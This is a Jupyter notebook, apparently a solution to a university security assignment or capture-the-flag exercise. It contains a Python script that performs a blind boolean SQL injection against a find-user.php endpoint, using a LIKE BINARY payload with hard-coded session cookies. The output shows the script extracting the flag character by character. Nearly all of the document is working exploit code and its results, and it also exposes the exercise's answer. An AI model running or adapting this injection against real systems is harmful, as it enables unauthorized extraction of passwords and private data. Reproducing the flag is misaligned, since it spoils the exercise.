{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "FLAG{W\n",
      "FLAG{We\n",
      "FLAG{Wea\n",
      "FLAG{Wear\n",
      "FLAG{Wear_\n",
      "FLAG{Wear_s\n",
      "FLAG{Wear_so\n",
      "FLAG{Wear_som\n",
      "FLAG{Wear_some\n",
      "FLAG{Wear_some_\n",
      "FLAG{Wear_some_g\n",
      "FLAG{Wear_some_gl\n",
      "FLAG{Wear_some_gla\n",
      "FLAG{Wear_some_glas\n",
      "FLAG{Wear_some_glass\n",
      "FLAG{Wear_some_glasse\n",
      "FLAG{Wear_some_glasses\n",
      "FLAG{Wear_some_glasses_\n",
      "FLAG{Wear_some_glasses_m\n",
      "FLAG{Wear_some_glasses_mi\n",
      "FLAG{Wear_some_glasses_min\n",
      "FLAG{Wear_some_glasses_mini\n",
      "FLAG{Wear_some_glasses_minio\n",
      "FLAG{Wear_some_glasses_minion\n",
      "FLAG{Wear_some_glasses_minions\n",
      "FLAG{Wear_some_glasses_minions!\n",
      "FLAG{Wear_some_glasses_minions!}\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "url='http://assignment-hermes.unimelb.life/find-user.php?'\n",
    "cookies={'CSRF_token':'e2evX2U5gpu8crVsdSadTloQi6dwbomjRHlvmqJgkDVv5jBjx5uWpFM87CPyz9H9', \n",
    "         'PHPSESSID':'5lju0rqqf74ia89aptq668vv65'}\n",
    "alphabets='QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm{}}!'\n",
    "payload='username=%\\'+AND+password+like+BINARY+\\'FLAG{'\n",
    "for count in range(27):\n",
    "    verify=1\n",
    "    for i in alphabets:\n",
    "        final_payload=payload+i+'%\\'+--+'\n",
    "        r=requests.get(url+final_payload,cookies=cookies)\n",
    "        if r.text!='true':\n",
    "            continue\n",
    "        payload+=i\n",
    "        verify+=1\n",
    "        print(payload[38:])\n",
    "        break\n",
    "    if verify==1:\n",
    "        payload+='_'\n",
    "        print(payload[38:])        "
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
